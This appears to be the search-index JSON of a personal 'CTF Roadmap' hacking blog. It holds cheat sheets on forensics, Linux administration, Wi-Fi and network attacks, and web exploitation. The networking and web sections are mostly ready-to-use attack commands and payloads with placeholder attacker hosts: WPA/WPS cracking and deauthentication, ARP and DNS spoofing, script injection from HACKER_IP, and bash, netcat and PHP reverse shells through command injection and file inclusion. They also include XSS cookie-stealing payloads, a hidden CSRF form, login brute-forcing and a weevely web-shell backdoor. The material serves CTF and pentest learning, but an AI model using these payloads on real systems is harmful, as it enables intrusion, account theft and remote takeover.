{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"#welcome-to-ctf-roadmap","text":"This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"author/","text":"Author Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Root Me ; Try Hack Me ; Hack The Box . CTFs History Event Rank DG'hAck 2020 360/2069","title":"Author"},{"location":"author/#author","text":"Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Root Me ; Try Hack Me ; Hack The Box .","title":"Author"},{"location":"author/#ctfs-history","text":"Event Rank DG'hAck 2020 360/2069","title":"CTFs History"},{"location":"forensics/","text":"Digital Forensics Memory ROM : file system ; RAM : data structure, memory pages (4 Ko), volatile. Disk Image # copy disk content to file dd if=/dev/SRC of=/tmp/DST # check file format file /tmp/DST # mount disk file for analysis mount -o loop /tmp/DST /mnt/ARTEFACT","title":"Forensics"},{"location":"forensics/#digital-forensics","text":"","title":"Digital Forensics"},{"location":"forensics/#memory","text":"ROM : file system ; RAM : data structure, memory pages (4 Ko), volatile.","title":"Memory"},{"location":"forensics/#disk-image","text":"# copy disk content to file dd if=/dev/SRC of=/tmp/DST # check file format file /tmp/DST # mount disk file for analysis mount -o loop /tmp/DST /mnt/ARTEFACT","title":"Disk Image"},{"location":"linux/","text":"Linux Hacking System Basics # rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat SERVICE # get service status systemctl status SERVICE # manage service state systemctl start|stop|restart|reload SERVICE systemctl enable|disable SERVICE # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub Filesystem # get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/DST # mount a partition sudo mount /dev/SRC /media/DST # mount in read only mode sudo mount -r /dev/SRC /media/DST # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/SRC /media/DST # mount a disk image sudo mount -o loop DISK_FILE /media/DST # unmount a partition sudo umount /media/DST # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n LABEL /dev/SRC Network Configuration # get info about network interfaces ip -br a # assign ip addr to interface ip a add IP/MASK dev IFACE # remove ip addr from interface ip a del IP dev IFACE # change interface state ip link set dev IFACE up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add IP/MASK via GATEWAY_IP ip r add default IP/MASK via GATEWAY_IP # delete a route ip r del default # change MAC addr ip link set dev IFACE address MAC_ADDR Compilation # get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall Archiving & Compression # create a basic archive tar -cvf ARCHIVE.tar FILES # extract from a basic archive tar -xvf ARCHIVE.tar # create and compress a gzip archive tar -zcvf ARCHIVE.tar.gz FILES # extract from a gzip archive tar -zxvf ARCHIVE.tar.gz # create and compress a bzip2 archive tar -jcvf ARCHIVE.tar.bz2 FILES # extract from a bzip2 archive tar -jxvf ARCHIVE.tar.bz2 # create and compress a lzma archive tar -Jcvf ARCHIVE.tar.xz FILES # extract from a lzma archive tar -Jxvf ARCHIVE.tar.xz # create and compress a zip archive zip ARCHIVE.zip FILES zip -r ARCHIVE.zip DIR # extract from a zip archive unzip ARCHIVE.zip -d DIR Users & Groups # get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd USER sudo passwd USER # create a group sudo groupadd GROUP # delete a user sudo userdel -r USER # delete a group sudo groupdel GROUP # add user to group sudo usermod -aG GROUP USER # remove user from group sudo gpasswd -d USER GROUP # change user default shell sudo usermod -s /bin/sh USER # get user membership groups USER id USER Root Access # login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo CMD # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers SSH (Secure Shell) # connection ssh USER@HOST -p PORT SCP (Secure Copy) # copy local file to remote destination scp SRC USER@HOST:DST # copy local directory to remote destination scp -r SRC USER@HOST:DST # copy remote data to local destination scp USER@HOST:SRC DST FTP (File Transfer Protocol) # connection ftp HOST > user > get FILE > put FILE","title":"Linux"},{"location":"linux/#linux-hacking","text":"","title":"Linux Hacking"},{"location":"linux/#system-basics","text":"# rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat SERVICE # get service status systemctl status SERVICE # manage service state systemctl start|stop|restart|reload SERVICE systemctl enable|disable SERVICE # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub","title":"System Basics"},{"location":"linux/#filesystem","text":"# get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/DST # mount a partition sudo mount /dev/SRC /media/DST # mount in read only mode sudo mount -r /dev/SRC /media/DST # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/SRC /media/DST # mount a disk image sudo mount -o loop DISK_FILE /media/DST # unmount a partition sudo umount /media/DST # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n LABEL /dev/SRC","title":"Filesystem"},{"location":"linux/#network-configuration","text":"# get info about network interfaces ip -br a # assign ip addr to interface ip a add IP/MASK dev IFACE # remove ip addr from interface ip a del IP dev IFACE # change interface state ip link set dev IFACE up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add IP/MASK via GATEWAY_IP ip r add default IP/MASK via GATEWAY_IP # delete a route ip r del default # change MAC addr ip link set dev IFACE address MAC_ADDR","title":"Network Configuration"},{"location":"linux/#compilation","text":"# get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall","title":"Compilation"},{"location":"linux/#archiving-compression","text":"# create a basic archive tar -cvf ARCHIVE.tar FILES # extract from a basic archive tar -xvf ARCHIVE.tar # create and compress a gzip archive tar -zcvf ARCHIVE.tar.gz FILES # extract from a gzip archive tar -zxvf ARCHIVE.tar.gz # create and compress a bzip2 archive tar -jcvf ARCHIVE.tar.bz2 FILES # extract from a bzip2 archive tar -jxvf ARCHIVE.tar.bz2 # create and compress a lzma archive tar -Jcvf ARCHIVE.tar.xz FILES # extract from a lzma archive tar -Jxvf ARCHIVE.tar.xz # create and compress a zip archive zip ARCHIVE.zip FILES zip -r ARCHIVE.zip DIR # extract from a zip archive unzip ARCHIVE.zip -d DIR","title":"Archiving &amp; Compression"},{"location":"linux/#users-groups","text":"# get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd USER sudo passwd USER # create a group sudo groupadd GROUP # delete a user sudo userdel -r USER # delete a group sudo groupdel GROUP # add user to group sudo usermod -aG GROUP USER # remove user from group sudo gpasswd -d USER GROUP # change user default shell sudo usermod -s /bin/sh USER # get user membership groups USER id USER","title":"Users &amp; Groups"},{"location":"linux/#root-access","text":"# login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo CMD # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers","title":"Root Access"},{"location":"linux/#ssh-secure-shell","text":"# connection ssh USER@HOST -p PORT","title":"SSH (Secure Shell)"},{"location":"linux/#scp-secure-copy","text":"# copy local file to remote destination scp SRC USER@HOST:DST # copy local directory to remote destination scp -r SRC USER@HOST:DST # copy remote data to local destination scp USER@HOST:SRC DST","title":"SCP (Secure Copy)"},{"location":"linux/#ftp-file-transfer-protocol","text":"# connection ftp HOST > user > get FILE > put FILE","title":"FTP (File Transfer Protocol)"},{"location":"networking/","text":"Network Hacking Information Gathering # alter mac address ifconfig IFACE down ifconfig IFACE hw ether MAC_ADDR ifconfig IFACE up # set up wifi interface to sniff packets ifconfig IFACE down airmon-ng check kill iwconfig IFACE mode monitor ifconfig IFACE up # discover wifi boxes airodump-ng IFACE # packet sniffing airodump-ng --bssid BSSID --channel CHANNEL --write sniff IFACE Exploitation Stage WEP Cracking # recover bssid password from sniff capture aircrack-ng sniff.cap WPA/WPA2 Cracking WPS Enabled # check for wifi boxes using WPS wash --interface IFACE # brute force WPS reaver --bssid BSSID --channel CHANNEL --interface IFACE -vvv --no-associate # associate with the WPS bssid aireplay-ng --fakeauth 30 -a BSSID -h MAC_ADDR IFACE WPS Disabled # handshake sniffing airodump-ng --bssid BSSID --channel CHANNEL --write handshake IFACE # disconnect a client from its bssid to force handshake to be resent aireplay-ng --deauth 5 -a BSSID -c CLIENT IFACE # crack the handshake using a wordlist aircrack-ng handshake.cap -w WORDLIST Post-Exploitation Stage MITM Basics # discover LAN neighbors netdiscover -r IP_RANGE # get more details about neighbors nmap ; zenmap # run a MITM attack echo 1 > /proc/sys/net/ipv4/ip_forward bettercap -iface IFACE > caplets.show > net.probe on > net.show > set arp.spoof.fullduplex true > set arp.spoof.targets CLIENT > arp.spoof on > set net.sniff.local true > set net.sniff.output sniff > net.sniff on > set dns.spoof.all true > set dns.spoof.domains example.com,*.example.com > dns.spoof on MITM & Code Injection /* first step is to create a JS script to be injected with MITM */ var imported = document.createElement(\"script\"); imported.src = \"http://HACKER_IP:3000/hook.js\" document.head.appendChild(imported); # second step is to add this payload script into hstshijack caplet set hstshijack.payloads *:/PATH_TO_JS_SCRIPT # third step is to run bettercap with hstshijack caplet bettercap -iface IFACE > hstshijack/hstshijack # fourth and last step is to run beef to hook the target browser beef-xss","title":"Networking"},{"location":"networking/#network-hacking","text":"","title":"Network Hacking"},{"location":"networking/#information-gathering","text":"# alter mac address ifconfig IFACE down ifconfig IFACE hw ether MAC_ADDR ifconfig IFACE up # set up wifi interface to sniff packets ifconfig IFACE down airmon-ng check kill iwconfig IFACE mode monitor ifconfig IFACE up # discover wifi boxes airodump-ng IFACE # packet sniffing airodump-ng --bssid BSSID --channel CHANNEL --write sniff IFACE","title":"Information Gathering"},{"location":"networking/#exploitation-stage","text":"","title":"Exploitation Stage"},{"location":"networking/#wep-cracking","text":"# recover bssid password from sniff capture aircrack-ng sniff.cap","title":"WEP Cracking"},{"location":"networking/#wpawpa2-cracking","text":"","title":"WPA/WPA2 Cracking"},{"location":"networking/#wps-enabled","text":"# check for wifi boxes using WPS wash --interface IFACE # brute force WPS reaver --bssid BSSID --channel CHANNEL --interface IFACE -vvv --no-associate # associate with the WPS bssid aireplay-ng --fakeauth 30 -a BSSID -h MAC_ADDR IFACE","title":"WPS Enabled"},{"location":"networking/#wps-disabled","text":"# handshake sniffing airodump-ng --bssid BSSID --channel CHANNEL --write handshake IFACE # disconnect a client from its bssid to force handshake to be resent aireplay-ng --deauth 5 -a BSSID -c CLIENT IFACE # crack the handshake using a wordlist aircrack-ng handshake.cap -w WORDLIST","title":"WPS Disabled"},{"location":"networking/#post-exploitation-stage","text":"","title":"Post-Exploitation Stage"},{"location":"networking/#mitm-basics","text":"# discover LAN neighbors netdiscover -r IP_RANGE # get more details about neighbors nmap ; zenmap # run a MITM attack echo 1 > /proc/sys/net/ipv4/ip_forward bettercap -iface IFACE > caplets.show > net.probe on > net.show > set arp.spoof.fullduplex true > set arp.spoof.targets CLIENT > arp.spoof on > set net.sniff.local true > set net.sniff.output sniff > net.sniff on > set dns.spoof.all true > set dns.spoof.domains example.com,*.example.com > dns.spoof on","title":"MITM Basics"},{"location":"networking/#mitm-code-injection","text":"/* first step is to create a JS script to be injected with MITM */ var imported = document.createElement(\"script\"); imported.src = \"http://HACKER_IP:3000/hook.js\" document.head.appendChild(imported); # second step is to add this payload script into hstshijack caplet set hstshijack.payloads *:/PATH_TO_JS_SCRIPT # third step is to run bettercap with hstshijack caplet bettercap -iface IFACE > hstshijack/hstshijack # fourth and last step is to run beef to hook the target browser beef-xss","title":"MITM &amp; Code Injection"},{"location":"reversing/","text":"Reverse Engineering TODO","title":"Reversing"},{"location":"reversing/#reverse-engineering","text":"TODO","title":"Reverse Engineering"},{"location":"web/","text":"Web Hacking Information Gathering Websites sources: https://whois.domaintools.com/ ; https://sitereport.netcraft.com/ ; https://www.robtex.com/dns-lookup/ ; Softwares sources: Maltego ; TheHarvester ; Recong-NG. # subdomains discovery python knockpy.py DOMAIN # files and directories discovery dirb http://DOMAIN File Upload Vulnerabilities # create a reverse shell weevely generate PASS RSH # run reverse shell after upload weevely http://PATH_TO_UPLODED_RSH PASS > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg . Code Execution Vulnerabilities # add some commands after the expected one CMD ; bash -i >& /dev/tcp/ATK_IP/ATK_PORT 0>&1 CMD && php -r '$sock=fsockopen(\"ATK_IP\", ATK_PORT); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; CMD | nc -e /bin/sh ATK_IP ATK_PORT Local File Inclusion Vulnerabilities Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh ATK_IP ATK_PORT\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('NC_CMD_BASE64_ENCODED')); ?>\"@TARGET_IP . Remote File Inclusion Vulnerabilities # create reverse shell echo '<?php passthru(\"nc -e /bin/sh ATK_IP ATK_PORT\"); ?>' > RSH_PHP # include reverse shell from target curl http://DOMAIN/?page=http://ATK_IP/RSH_PHP # beautify a basic shell SHELL=/bin/sh script -q /dev/null SQL Injection Vulnerabilities DBMS Artefacts MySQL : functions: database() , version() , user() , load_file() ; tables: information_schema.tables , information_schema.columns . SQLi BruteForce # get db names sqlmap -u \"HOST_URL_WITH_PARAMS\" --dbs # get current user sqlmap -u \"HOST_URL_WITH_PARAMS\" --current-user # get tables from database sqlmap -u \"HOST_URL_WITH_PARAMS\" --tables -D DB_NAME # get columns from table sqlmap -u \"HOST_URL_WITH_PARAMS\" --columns -T {table} -D DB_NAME # dump table data sqlmap -u \"HOST_URL_WITH_PARAMS\" --dump -T {table} -D DB_NAME # get an os shell sqlmap -u \"HOST_URL_WITH_PARAMS\" --os-shell # get an sql shell sqlmap -u \"HOST_URL_WITH_PARAMS\" --sql-shell XSS Vulnerabilities <!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'CATCHER_SITE'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = 'CATCHER_SITE?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://ATK_IP/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'ATK_IP'$IFS'ATK_PORT')> <!-- hook target using BEEF --> <script src=\"http://ATK_IP:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar. CSRF Vulnerabilities <!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://PATH_TO_WEBSITE_WITH_MALICIOUS_FORM\" method=\"post\" hidden> <input name=\"NAME\" value=\"VALUE\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://ATK_TIINY_SITE\"></a> Brute Force & Dictionnary Attack # create a wordlist crunch MIN_LENGTH MAX_LENGTH SYMBOLS -t PATTERN -o OUTPUT_FILE # crack a post login form using the wordlist hydra TARGET_IP -l USER -P WORDLIST http-post-form \"/PATH_TO_LOGIN:USER=^USER^&PASS=^PASS^:F=FAIL_MSG\" Post Exploitation # weaponize a strong web shell weevely generate PASS RSH_PHP # upload rsh on the target wget http://ATK_IP/RSH_PHP # execute rsh weevely http://TARGET_IP/RSH_PHP PASS > help > system-info > shell-sh -vector VECTOR CMD > file_read -vector VECTOR FILE > file_download -vector VECTOR REMOTE_PATH LOCAL_PATH > file_upload -vector VECTOR LOCAL_PATH ./REMOTE_PATH > backdoor_reversetcp -vector VECTOR ATK_IP ATK_PORT > sql_dump -vector VECTOR -host localhost -lpath LOCAL_PATH DB_NAME USER PASS","title":"Web"},{"location":"web/#web-hacking","text":"","title":"Web Hacking"},{"location":"web/#information-gathering","text":"Websites sources: https://whois.domaintools.com/ ; https://sitereport.netcraft.com/ ; https://www.robtex.com/dns-lookup/ ; Softwares sources: Maltego ; TheHarvester ; Recong-NG. # subdomains discovery python knockpy.py DOMAIN # files and directories discovery dirb http://DOMAIN","title":"Information Gathering"},{"location":"web/#file-upload-vulnerabilities","text":"# create a reverse shell weevely generate PASS RSH # run reverse shell after upload weevely http://PATH_TO_UPLODED_RSH PASS > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg .","title":"File Upload Vulnerabilities"},{"location":"web/#code-execution-vulnerabilities","text":"# add some commands after the expected one CMD ; bash -i >& /dev/tcp/ATK_IP/ATK_PORT 0>&1 CMD && php -r '$sock=fsockopen(\"ATK_IP\", ATK_PORT); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; CMD | nc -e /bin/sh ATK_IP ATK_PORT","title":"Code Execution Vulnerabilities"},{"location":"web/#local-file-inclusion-vulnerabilities","text":"Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh ATK_IP ATK_PORT\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('NC_CMD_BASE64_ENCODED')); ?>\"@TARGET_IP .","title":"Local File Inclusion Vulnerabilities"},{"location":"web/#remote-file-inclusion-vulnerabilities","text":"# create reverse shell echo '<?php passthru(\"nc -e /bin/sh ATK_IP ATK_PORT\"); ?>' > RSH_PHP # include reverse shell from target curl http://DOMAIN/?page=http://ATK_IP/RSH_PHP # beautify a basic shell SHELL=/bin/sh script -q /dev/null","title":"Remote File Inclusion Vulnerabilities"},{"location":"web/#sql-injection-vulnerabilities","text":"","title":"SQL Injection Vulnerabilities"},{"location":"web/#dbms-artefacts","text":"MySQL : functions: database() , version() , user() , load_file() ; tables: information_schema.tables , information_schema.columns .","title":"DBMS Artefacts"},{"location":"web/#sqli-bruteforce","text":"# get db names sqlmap -u \"HOST_URL_WITH_PARAMS\" --dbs # get current user sqlmap -u \"HOST_URL_WITH_PARAMS\" --current-user # get tables from database sqlmap -u \"HOST_URL_WITH_PARAMS\" --tables -D DB_NAME # get columns from table sqlmap -u \"HOST_URL_WITH_PARAMS\" --columns -T {table} -D DB_NAME # dump table data sqlmap -u \"HOST_URL_WITH_PARAMS\" --dump -T {table} -D DB_NAME # get an os shell sqlmap -u \"HOST_URL_WITH_PARAMS\" --os-shell # get an sql shell sqlmap -u \"HOST_URL_WITH_PARAMS\" --sql-shell","title":"SQLi BruteForce"},{"location":"web/#xss-vulnerabilities","text":"<!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'CATCHER_SITE'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = 'CATCHER_SITE?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://ATK_IP/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'ATK_IP'$IFS'ATK_PORT')> <!-- hook target using BEEF --> <script src=\"http://ATK_IP:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar.","title":"XSS Vulnerabilities"},{"location":"web/#csrf-vulnerabilities","text":"<!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://PATH_TO_WEBSITE_WITH_MALICIOUS_FORM\" method=\"post\" hidden> <input name=\"NAME\" value=\"VALUE\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://ATK_TIINY_SITE\"></a>","title":"CSRF Vulnerabilities"},{"location":"web/#brute-force-dictionnary-attack","text":"# create a wordlist crunch MIN_LENGTH MAX_LENGTH SYMBOLS -t PATTERN -o OUTPUT_FILE # crack a post login form using the wordlist hydra TARGET_IP -l USER -P WORDLIST http-post-form \"/PATH_TO_LOGIN:USER=^USER^&PASS=^PASS^:F=FAIL_MSG\"","title":"Brute Force &amp; Dictionnary Attack"},{"location":"web/#post-exploitation","text":"# weaponize a strong web shell weevely generate PASS RSH_PHP # upload rsh on the target wget http://ATK_IP/RSH_PHP # execute rsh weevely http://TARGET_IP/RSH_PHP PASS > help > system-info > shell-sh -vector VECTOR CMD > file_read -vector VECTOR FILE > file_download -vector VECTOR REMOTE_PATH LOCAL_PATH > file_upload -vector VECTOR LOCAL_PATH ./REMOTE_PATH > backdoor_reversetcp -vector VECTOR ATK_IP ATK_PORT > sql_dump -vector VECTOR -host localhost -lpath LOCAL_PATH DB_NAME USER PASS","title":"Post Exploitation"},{"location":"windows/","text":"Windows Hacking TODO","title":"Windows"},{"location":"windows/#windows-hacking","text":"TODO","title":"Windows Hacking"}]}